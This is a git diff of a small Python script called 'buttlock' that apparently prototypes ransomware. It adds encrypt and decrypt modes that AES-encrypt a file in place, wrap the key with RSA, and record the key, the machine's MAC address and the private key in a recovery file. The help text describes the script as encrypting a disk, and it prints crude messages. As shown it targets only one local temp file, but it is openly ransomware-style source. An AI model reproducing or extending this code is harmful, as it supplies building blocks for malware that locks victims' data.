@@ -1,18 +1,46 @@
 from core import Buttcrypt, Buttnet
 import base64
+import click
 
-buttcrypt = Buttcrypt.Buttcrypt()
 
-#print(buttcrypt._aes_key)
-encrypted_aes_key = buttcrypt.RSAEncryptContent(buttcrypt._aes_key)
-#print(encrypted_aes_key)
+@click.command()
+@click.option("--mode", default="encrypt", help="buttlock mode. encrypt for encrypt disk and decrypt for decrypt disk")
+def buttlock(mode):
+    if mode == "encrypt":
+        print("it's raining dicks down on your disk")
+       
+        buttcrypt = Buttcrypt.Buttcrypt()
+        encrypted_aes_key = buttcrypt.RSAEncryptContent(buttcrypt.getAesKey())
 
-# decode = base64.b64decode(encrypted_aes_key)
-# print(decode)
+        with open("./temp/buttlock_recovery", "wb+") as crypto_out:
+            crypto_out.write(encrypted_aes_key)
+            crypto_out.write(str(";").encode('utf-8'))
+            crypto_out.write(str(Buttnet.getMacAddress()).encode('utf-8'))
+            crypto_out.write(str(";").encode('utf-8'))
+            crypto_out.write(buttcrypt.getPrivateKey())
+        with open("./temp/butt.txt", "rb") as in_file:
+            encrypted_content = buttcrypt.encryptContent(in_file.read())
+            with open("./temp/butt.txt", "wb+") as out_file:
+                out_file.write(encrypted_content)
 
-# decrypted = buttcrypt.RSADecryptContent(decode)
-# print(decrypted)
+    if mode == "decrypt":
+        print("undick your disk")    
 
-cryptoContent = (encrypted_aes_key, Buttnet.getMacAddress(), base64.b64encode(buttcrypt._rsa_private_key_string))
+        with open("./temp/buttlock_recovery", "rb") as crypto_in:
+            crypto_in_arr = crypto_in.read().decode("utf-8").split(";")
+            
+            encrypted_aes_key = crypto_in_arr[0].strip()
+            mac_address = crypto_in_arr[1]
+            private_key = crypto_in_arr[2].strip()
 
-print(cryptoContent)
+            buttcrypt = Buttcrypt.Buttcrypt()
+            decrypted_aes_key = buttcrypt.RSADecryptContent(base64.b64decode(encrypted_aes_key), private_key)
+
+            with open("./temp/butt.txt", "rb") as encrypted_input:
+                decrypted = buttcrypt.decryptContent(decrypted_aes_key, encrypted_input.read())
+                with open("./temp/butt.txt", "wb") as out_file:
+                    out_file.write(decrypted)
+
+
+if __name__ == '__main__':
+    buttlock()
